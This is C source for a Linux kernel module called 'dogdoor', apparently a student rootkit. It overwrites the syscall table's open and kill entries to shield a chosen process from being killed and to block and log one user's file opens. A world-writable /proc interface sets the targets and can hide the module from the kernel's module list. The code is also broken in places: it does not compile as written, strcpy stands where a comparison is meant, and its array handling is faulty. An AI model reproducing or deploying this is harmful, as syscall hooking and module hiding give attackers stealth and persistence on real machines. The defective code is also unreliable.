#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
//#include <stdlib.h>

MODULE_LICENSE("GPL");

static struct list_head *new = &(THIS_MODULE->list);
static struct list_head *head;
char filepath[128] = { 0x0, } ;
unsigned int userID = 1;
unsigned int processID = 1;
char Hide[32] = { 0x0, };
void ** sctable ;
int count = 0 ;
int hide =0;
int unhide =0;
char of0[256];
char of1[256];
char of2[256];
char of3[256];
char of4[256];
char of5[256];
char of6[256];
char of7[256];
char of8[256];
char of9[256];
char *listOF[10] = {of0, of2, of3, of4, of5, of6,of7,of8, of9};

asmlinkage int (*orig_sys_kill)(pid_t pid, int sig) ;

asmlinkage int dogdoor_sys_kill(pid_t pid, int sig)
{
        if(pid == processID)
                return -1 ;
        
        return orig_sys_kill(pid, sig);
}

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 

asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{
        char fname[256] ;
        uid_t crtuser = (unsigned int) 0;
        crtuser = (unsigned int) current->cred->uid.val;

        copy_from_user(fname, filename, 256) ;

        if (filepath[0] != 0x0 && userID == crtuser && count < 10) {
                sscanf(fname, "%s", listOF[count]); 
                count++ ;
                return -1 ;
        }
        return orig_sys_open(filename, flags, mode);
}


static 
int dogdoor_proc_open(struct inode *inode, struct file *file) {
        return 0 ;
}

static 
int dogdoor_proc_release(struct inode *inode, struct file *file) {
        return 0 ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
        char buf[256] ;
        ssize_t toread = 0 ;
        int i = 0;

        sprintf(buf, "%u\n", userID);
        for (i=0; i < count; i++) {
                sprintf(buf, "%s\n", listOF[i]);

                toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

                if (copy_to_user(ubuf, buf + *offset, toread))
                        return -EFAULT ;
                *offset = *offset + toread ;
        }
        return toread ;
}

static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
        char buf[32] ;

        if (*offset != 0 || size > 32)
                return -EFAULT ;

        if (copy_from_user(buf, ubuf, size))
                return -EFAULT ;

        if (buf[0] == 'u') {
                sscanf(buf+sizeof(char), "%u", &userID);
                openedfile = {0x0,}; 초기화 시켜주기
                count =0;
        }

        if (buf[0] == 'p') {
                sscanf(buf+sizeof(char), "%u", &processID);
        }

        if (buf[0] == 'h') {
                sscanf(buf+sizeof(char), "%c", Hide);
        }
        
        if(hide==0&&strcpy(buf,"hide")==0){
                 list_del(new);
                  hide = 1;
        }
        if(hide==1 && strcpy(buf,"unhide")==0){
                list_add(new, head);
                hide = 0;
        }

        *offset = strlen(buf) ;

        return *offset ;
}

static const struct file_operations dogdoor_fops = {
        .owner =        THIS_MODULE,
        .open =         dogdoor_proc_open,
        .read =         dogdoor_proc_read,
        .write =        dogdoor_proc_write,
        .llseek =       seq_lseek,
        .release =      dogdoor_proc_release,
} ;

static 
int __init dogdoor_init(void) {
        unsigned int level ; 
        pte_t * pte ;

        proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;

        sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

        orig_sys_open = sctable[__NR_open] ;
        orig_sys_kill = sctable[__NR_kill] ;
        pte = lookup_address((unsigned long) sctable, &level) ;
        if (pte->pte &~ _PAGE_RW) 
                pte->pte |= _PAGE_RW ;          
        sctable[__NR_open] = dogdoor_sys_open ;
        sctable[__NR_kill] = dogdoor_sys_kill ;

        return 0;
}

static 
void __exit dogdoor_exit(void) {
        unsigned int level ;
        pte_t * pte ;
        remove_proc_entry("dogdoor", NULL) ;

        sctable[__NR_open] = orig_sys_open ;
        sctable[__NR_kill] = orig_sys_kill ;
        pte = lookup_address((unsigned long) sctable, &level) ;
        pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
